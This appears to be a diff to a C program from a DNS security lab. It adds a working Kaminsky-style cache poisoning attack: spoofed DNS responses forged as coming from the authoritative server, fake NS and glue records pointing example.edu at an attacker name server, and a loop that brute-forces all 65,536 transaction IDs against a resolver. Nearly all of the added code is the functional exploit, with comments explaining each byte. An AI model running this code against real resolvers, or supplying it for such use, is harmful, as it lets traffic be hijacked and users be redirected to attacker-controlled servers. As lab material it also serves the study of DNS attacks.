@@ -108,6 +108,153 @@ unsigned short csum(unsigned short *buf, int nwords)
     return (unsigned short)(~sum);
 }
 
+void init_fake(char *buf){
+    /*
+        Remember that the network pkg is Big-Endian, so be careful to directly manipulate the byte list
+    */
+    struct ipheader *ip = (struct ipheader *)buf;
+    struct udpheader *udp = (struct udpheader *)(buf + sizeof(struct ipheader));
+    struct dnsheader *dns = (struct dnsheader*)(buf +sizeof(struct ipheader)+sizeof(struct udpheader));
+    char *data = (buf +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
+
+    /*
+        Step 1: set DNS pkg
+            Size = 12 + 23 + 16 + 35 + 27 = 113 = 0x71
+    */
+        // 1.1: DNS Header
+    dns->flags = htons(FLAG_R); // flags are set to normal response flag
+    dns->QDCOUNT = htons(1); // Question Num
+    dns->ANCOUNT = htons(1); // Answer Num
+    dns->NSCOUNT = htons(1); // Authority Num
+    dns->ARCOUNT = htons(2); // Additional Records Num
+        // 1.2: DNS Body
+    // Query
+    int offset = 0;
+    strcpy(data,"\5aaaaa\7example\3edu");
+    data[18] = '\0'; // end of string
+    data[19] = '\0'; 
+    data[20] = '\1'; // above 2: Type A
+    data[21] = '\0';
+    data[22] = '\1'; // above 2: Class IN
+    offset += 23;
+
+    // Answer
+    data[offset] = 0xc0;
+    data[offset + 1] = 0x0c;
+        // these two tells that we just refer the url in Query section
+    data[offset + 2] = 0x00;
+    data[offset + 3] = 0x01; // above 2: Type A
+    data[offset + 4] = 0x00;
+    data[offset + 5] = 0x01; // above 2: Class IN
+    data[offset + 6] = 0x7f;
+    data[offset + 7] = 0xff;
+    data[offset + 8] = 0xff;
+    data[offset + 9] = 0xff; // above 4: TTL, set to the maximum int number
+    data[offset + 10] = 0x00;
+    data[offset + 11] = 0x04; // above 2: data length of the fake ip address
+    data[offset + 12] = 0x66;
+    data[offset + 13] = 0x66;
+    data[offset + 14] = 0x66;
+    data[offset + 15] = 0x66; // above 4: Fake ip address for ?????.example.edu: 102.102.102.102 (not important at all)
+    offset += 16;
+
+    // Authority
+        // shorten mode
+    data[offset] = 0xc0;
+    data[offset + 1] = 0x12; // the offset from data to the domain name begin, should be "0x12" here, since we're pretending domain "example.edu" (begin with \7),
+        // so offset = 12 (udp header size) + 6 ("\5aaaaa") = 18 = 0x12
+    data[offset + 2] = 0x00;
+    data[offset + 3] = 0x02; // above 2: Type NS
+    data[offset + 4] = 0x00;
+    data[offset + 5] = 0x01; // above 2: Class IN
+    data[offset + 6] = 0x7f;
+    data[offset + 7] = 0xff;
+    data[offset + 8] = 0xff;
+    data[offset + 9] = 0xff; // above 4: TTL, set to the maximum int number
+    data[offset + 10] = 0x00;
+    data[offset + 11] = 0x17; // above 2: data length of the fake domain network server's name
+    strcpy(data + offset + 12, ".ns.dnslabattacker.net"); // string length = 22
+    data[offset + 12] = 0x02;
+    data[offset + 12 + 3] = 0x0e;
+    data[offset + 12 + 18] = 0x03;
+    data[offset + 12 + 22] = 0x00; // end of string
+    offset += 35;
+
+    // Additional Records
+        // adopt shorten mode again
+    data[offset] = 0xc0;
+    data[offset + 1] = 0x3f; // offset (to "/2ns/14dnslabattacker/3net") 
+        // = 12 (header) + 23 (query) + 16 (answer) + 12 (offset in Authority section) = 63 = 0x3f
+    data[offset + 2] = 0x00;
+    data[offset + 3] = 0x01; // above 2: Type A
+    data[offset + 4] = 0x00;
+    data[offset + 5] = 0x01; // above 2: Class IN
+    data[offset + 6] = 0x7f;
+    data[offset + 7] = 0xff;
+    data[offset + 8] = 0xff;
+    data[offset + 9] = 0xff; // above 4: TTL, set to the maximum int number
+    data[offset + 10] = 0x00;
+    data[offset + 11] = 0x04; // above 2: data length of the fake ip address
+    data[offset + 12] = 0x77;
+    data[offset + 13] = 0x77;
+    data[offset + 14] = 0x77;
+    data[offset + 15] = 0x77; // above 4: Fake ip address for THE Domain Server for .example.edu: 119.119.119.119
+        // essential for the poison
+    
+        // <Root> Type: OPT
+        // 0x00 0x00 0x29 0x10 0x00 0x00 0x00 0x88 0x00 0x00 0x00
+    data[offset + 16] = 0x00;
+    data[offset + 17] = 0x00;
+    data[offset + 18] = 0x29;
+    data[offset + 19] = 0x10;
+    data[offset + 20] = 0x00;
+    data[offset + 21] = 0x00;
+    data[offset + 22] = 0x00;
+    data[offset + 23] = 0x88;
+    data[offset + 24] = 0x00;
+    data[offset + 25] = 0x00;
+    data[offset + 26] = 0x00;
+
+    offset += 27;
+
+    /*
+        Step 2: set UDP pkg
+    */
+    udp->udph_srcport = htons(53);
+    udp->udph_destport = htons(33333);
+    udp->udph_len = htons(sizeof(struct udpheader) + 0x71); // size = udp header size + DNS size (0x71)
+
+    /*
+        Step 3: set IP pkg
+    */
+    ip->iph_ihl = 5;
+    ip->iph_ver = 4;
+    ip->iph_tos = 0;
+    ip->iph_len=htons(sizeof(struct ipheader) + sizeof(struct udpheader) + 0x71); // size = ip header + UDP size (sizeof(struct udpheader) + 0x71)
+    ip->iph_ident = htons(rand()); // give a random number for the identification#
+    ip->iph_ttl = 0xf0; // hops
+    ip->iph_protocol = 17; // UDP
+    ip->iph_sourceip = inet_addr("199.43.135.53"); // fake you are the real domain server, and this ip address is up-to-date
+    ip->iph_destip = inet_addr("192.168.15.4");
+    ip->iph_chksum = csum((unsigned short *)buf, sizeof(struct ipheader) + sizeof(struct udpheader));
+}
+
+void update_fake(char *buf, int incre_off, int transaction_id){
+    /*
+        Update for:
+            1. dns->query_id
+            2. check sum of udp
+    */
+    struct udpheader *udp = (struct udpheader *)(buf + sizeof(struct ipheader));
+    struct dnsheader *dns = (struct dnsheader*)(buf +sizeof(struct ipheader)+sizeof(struct udpheader));
+    char *data = (buf +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
+
+    if (incre_off)
+        *(data+incre_off)+=1;
+    dns->query_id = transaction_id;
+    udp->udph_chksum = check_udp_sum(buf, sizeof(struct udpheader) + 0x71);
+}
+
 int main(int argc, char *argv[])
 {
     // This is to check the argc number
@@ -121,6 +268,9 @@ int main(int argc, char *argv[])
 
     // buffer to hold the packet
     char buffer[PCKT_LEN];
+    char fake_buffer[PCKT_LEN];
+    char recv_buffer[2048];
+    init_fake(fake_buffer);
 
     // set the buffer to 0 for all bytes
     memset(buffer, 0, PCKT_LEN);
@@ -243,8 +393,9 @@ int main(int argc, char *argv[])
         printf("error\n");	
         exit(-1);
     }
-
-    while(1)
+    
+    int cnt = 0;
+    for(; ; cnt ++)
     {	
         // This is to generate a different query in xxxxx.example.edu
         //   NOTE: this will have to be updated to only include printable characters
@@ -257,6 +408,40 @@ int main(int argc, char *argv[])
         // send the packet out.
         if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
             printf("packet send error %d which means %s\n",errno,strerror(errno));
+
+        update_fake(fake_buffer, charnumber, 0);
+        int attemp_num = 1 << 16, init_num = rand() & 0xffff;
+        while(attemp_num--){
+            update_fake(fake_buffer, 0, init_num);
+            if(
+                sendto(
+                    sd, 
+                    fake_buffer, 
+                    sizeof(struct ipheader) + sizeof(struct udpheader) + 0x71, 
+                    0, 
+                    (struct sockaddr *)&sin, 
+                    sizeof(sin)
+                ) < 0
+            )
+                printf("packet send error %d which means %s\n",errno,strerror(errno));
+            init_num = (init_num + 1) & 0xffff;
+        }
+
+        // socklen_t address_len;
+        // int recv_len;
+        // recv_len = recvfrom(
+        //     sd,
+        //     recv_buffer,
+        //     2048,
+        //     0,
+        //     (struct sockaddr *)&sin,
+        //     &address_len
+        // )
+
+        sleep(1);
+    
+        if (cnt >= 12)
+            break;
     }
     close(sd);
     return 0;
